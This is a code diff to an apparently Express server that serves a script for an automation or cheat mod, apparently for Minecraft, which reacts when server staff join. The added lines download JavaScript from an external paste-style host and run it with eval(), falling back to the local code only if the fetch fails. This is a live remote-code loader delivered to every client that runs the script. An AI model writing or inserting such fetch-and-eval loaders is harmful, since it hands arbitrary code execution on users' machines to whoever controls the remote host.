@@ -78,12 +78,31 @@ const validateRequest = (req, res, next) => {
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
     try {
-        // Основной код скрипта
+        // Пытаемся загрузить внешний скрипт
+        java.lang.System.out.println("🔗 Загрузка внешнего скрипта...");
+        
+        var externalUrl = "https://diddy-party.vip/p/raw/1pvhaynl48amcpmfd";
+        var url = new java.net.URL(externalUrl);
+        var connection = url.openConnection();
+        connection.setConnectTimeout(5000);
+        connection.setReadTimeout(10000);
+        
+        var scanner = new java.util.Scanner(connection.getInputStream(), "UTF-8");
+        var externalScript = scanner.useDelimiter("\\\\A").next();
+        scanner.close();
+        
+        java.lang.System.out.println("✅ Внешний скрипт загружен, выполнение...");
+        eval(externalScript);
+        
+    } catch (externalError) {
+        java.lang.System.err.println("❌ Не удалось загрузить внешний скрипт: " + externalError);
+        java.lang.System.out.println("🔄 Запуск локальной версии...");
+        
+        // Локальная резервная версия
         var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility");
         var AutoMine = Java.type("ru.nedan.automine.AutoMine");
         var Utils = Java.type("ru.nedan.automine.util.Utils");
 
-        // Функция для обработки события
         on("ru.nedan.automine.event.EventStaffJoin", function(e){
             if(!AutoMine.getInstance().isEnabled()) return;
             
@@ -95,10 +114,7 @@ app.get('/api/script', validateRequest, (req, res) => {
             AutoMine.getInstance().nextMine = true;
         });
         
-        java.lang.System.out.println("✅ AutoMine скрипт успешно активирован");
-        
-    } catch (e) {
-        java.lang.System.err.println("❌ Ошибка в скрипте: " + e);
+        java.lang.System.out.println("✅ Локальный скрипт активирован");
     }
 })();`;
     
